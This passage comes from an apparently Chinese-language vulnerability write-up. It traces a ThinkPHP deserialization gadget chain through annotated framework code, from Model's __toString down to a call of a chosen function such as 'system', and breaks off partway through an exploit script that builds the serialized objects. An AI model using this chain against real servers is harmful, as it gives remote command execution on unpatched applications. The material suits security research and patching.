<li><p><code>Pivot-&gt;getAttr</code>：<code>Attribute-&gt;getAttr</code></p>
</li>
</ul>
<p>因此首先会有 <strong><code>Conversion-&gt;__toString → Conversion-&gt;toJson → Conversion-&gt;toArray</code></strong> 调用链。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 转换当前模型对象为JSON字符串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  integer $options json参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">toArray</span>(), <span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>toArray</code> 方法最终会调用 <code>Attribute-&gt;getAttr</code> 方法，参数为 <code>$this-&gt;data</code> 中的其中一项的键，这里为 <code>&quot;key&quot;</code>。期间的几个判断只要我们让 <code>Pivot</code> 相关字段都保持默认值即可绕过。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 转换当前模型对象为数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$item</span> = <span class="variable">$visible</span> = <span class="variable">$hidden</span> = [];</span><br><span class="line">    <span class="variable">$hasVisible</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ❌ $this-&gt;visible 为空不进入循环</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;visible <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ❌ $this-&gt;hidden 为空不进入循环</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;hidden <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ❌ $this-&gt;append 为空不进入循环</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 合并 $this-&gt;data 和 $this-&gt;relation</span></span><br><span class="line">    <span class="comment">// 由于 $this-&gt;relation 为空因此合并后还是 $this-&gt;data</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="comment">// $val 是数组且 $visible，$hidden 为空且 $hasVisible 为 false</span></span><br><span class="line">        <span class="comment">// 📌 因此只会进入最后一个分支</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$visible</span>[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable">$hidden</span>[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>); <span class="comment">// 👈 调用 Attribute-&gt;getAttr 方法</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Attribute-&gt;getAttr</code> 先调用 <code>$this-&gt;getData</code> 获取到 <code>$value</code>，然后调用 <code>$this-&gt;getValue</code> 函数并依次传入 <code>$name = &quot;key&quot;</code>，<code>$value</code>，<code>$relation = false</code> 三个参数。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取器 获取数据对象的值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $name 名称 = &quot;key&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidArgumentException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$relation</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$value</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getValue</span>(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>getData</code> 获取到的是 <code>$this-&gt;data[&quot;key&quot;] = [&quot;key&quot; =&gt; &quot;calc&quot;]</code>。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取实际的字段名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $name 字段名 = &quot;key&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRealFieldName</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 虽然可以通过设置 $this 的部分字段避免 $name 被修改</span></span><br><span class="line">    <span class="comment">// 但是这里我们设置 $name 为 &quot;key&quot; 不受转换的影响</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;convertNameToCamel || !<span class="variable language_">$this</span>-&gt;strict) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Str</span>::<span class="title function_ invoke__">snake</span>(<span class="variable">$name</span>); <span class="comment">// 驼峰转下划线</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取当前对象数据 如果不存在指定字段返回false</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $name 字段名 留空获取全部 = &quot;key&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidArgumentException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ❌ $name 不为空，不进入判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 我们设置的 name = &quot;key&quot; 不受 getRealFieldName 的影响</span></span><br><span class="line">    <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 $this-&gt;data 和 $this-&gt;relation 都行</span></span><br><span class="line">    <span class="comment">// 前面遍历键值对的 $data 也来自这两个数组成员合并的结果</span></span><br><span class="line">    <span class="comment">// 这里我们使用的是 $this-&gt;data</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="comment">// 📌 返回的是 $this-&gt;data[&quot;key&quot;] = [&quot;key&quot; =&gt; &quot;calc&quot;]</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$fieldName</span>];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$fieldName</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;property not exists:&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>getValue</code> 函数中虽然有一个闭包函数的调用，但是限制限制 <code>$closure</code> 为 <code>Closure</code> 的实例，因此不能实现任意方法调用。因此我们走另一个分支调用 <code>getJsonValue</code> 函数。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取经过获取器处理后的数据对象的值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string      $name 字段名称 = &quot;key&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  mixed       $value 字段值 = [&quot;key&quot; =&gt; &quot;calc&quot;]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  bool|string $relation 是否为关联属性或者关联名 = false</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidArgumentException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ✅ 和 getData 里的一样，我们设置的 name = &quot;key&quot; 不受 getRealFieldName 的影响</span></span><br><span class="line">    <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ❌ $this-&gt;get 为空，不进入判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;get)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;get[<span class="variable">$fieldName</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123; <span class="comment">// ❌ $relation 为 false，不进入判断</span></span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// $fieldName =&quot;key&quot;,$this-&gt;json = [&quot;key&quot;],$this-&gt;withAttr[&quot;key&quot;] = [&quot;key&quot; =&gt; &quot;system&quot;]</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$fieldName</span>, <span class="variable">$this</span>-&gt;json) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">            <span class="comment">// ✅ 调用 getJsonValue 函数</span></span><br><span class="line">            <span class="comment">// $fieldName =&quot;key&quot;,$value = [&quot;key&quot; =&gt; &quot;calc&quot;]</span></span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getJsonValue</span>(<span class="variable">$fieldName</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$closure</span> = <span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>];</span><br><span class="line">            <span class="comment">// ❌ 限制 $closure 为 Closure 的实例不能实现任意方法调用</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$closure</span> <span class="keyword">instanceof</span> \<span class="built_in">Closure</span>) &#123;</span><br><span class="line">                <span class="variable">$value</span> = <span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>getJsonValue</code> 同样存在闭包函数的调用，并且两处闭包调用都是可行的。这里我们采用其中一个即可。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取JSON字段属性值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  string $name  属性名 = &quot;key&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  mixed  $value JSON数据 = [&quot;key&quot; =&gt; &quot;calc&quot;]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getJsonValue</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ❌ $value 携带参数，因此不为空</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// $this-&gt;withAttr = [&quot;key&quot; =&gt; [&quot;key&quot; =&gt; &quot;system&quot;]]</span></span><br><span class="line">    <span class="comment">// $this-&gt;withAttr[$name] = [&quot;key&quot; =&gt; &quot;system&quot;]</span></span><br><span class="line">    <span class="comment">// $key = &quot;key&quot;, $closure = &quot;calc&quot;</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$name</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$closure</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;jsonAssoc) &#123;</span><br><span class="line">            <span class="comment">// 需要设置：</span></span><br><span class="line">            <span class="comment">// $this-&gt;jsonAssoc = true;</span></span><br><span class="line">            <span class="comment">// $this-&gt;data = [&quot;key&quot; =&gt; [&quot;key&quot; =&gt; &quot;calc&quot;]];</span></span><br><span class="line">            <span class="variable">$value</span>[<span class="variable">$key</span>] = <span class="variable">$closure</span>(<span class="variable">$value</span>[<span class="variable">$key</span>], <span class="variable">$value</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 需要设置：</span></span><br><span class="line">            <span class="comment">// $this-&gt;data[&quot;key&quot;] = stdClass();</span></span><br><span class="line">            <span class="comment">// $this-&gt;data[&quot;key&quot;]-&gt;key = &quot;calc&quot;;</span></span><br><span class="line">            <span class="variable">$value</span>-&gt;<span class="variable">$key</span> = <span class="variable">$closure</span>(<span class="variable">$value</span>-&gt;<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="利用脚本-3"><a href="#利用脚本-3" class="headerlink" title="利用脚本"></a>利用脚本</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span> &#123;</span><br><span class="line">    <span class="title class_">trait</span> <span class="title class_">Attribute</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">data</span>, $<span class="title class_">withAttr</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$json</span>, <span class="variable">$jsonAssoc</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">trait</span> <span class="title">ModelEvent</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">use</span> \<span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>\<span class="title class_">Attribute</span>;</span><br><span class="line">        <span class="keyword">use</span> \<span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span>, <span class="variable">$force</span>, <span class="variable">$lazySave</span>, <span class="variable">$data</span>, <span class="variable">$withAttr</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$suffix</span>, <span class="variable">$json</span>, <span class="variable">$jsonAssoc</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$depth</span>, <span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$depth</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;jsonAssoc);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;withAttr);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;json);</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;data = [<span class="number">0</span>];</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;suffix = <span class="keyword">new</span> \think\model\<span class="title function_ invoke__">Pivot</span>(<span class="number">1</span>, <span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;lazySave);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;suffix);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;force);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;exists);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;exists);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;withEvent);</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;jsonAssoc = <span class="literal">true</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&quot;key&quot;</span> =&gt; [<span class="string">&quot;key&quot;</span> =&gt; <span class="variable">$func</span>]];</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;key&quot;</span> =&gt; [<span class="string">&quot;key&quot;</span> =&gt; <span class="variable">$param</span>]];</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;json = [<span class="string">&quot;key&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    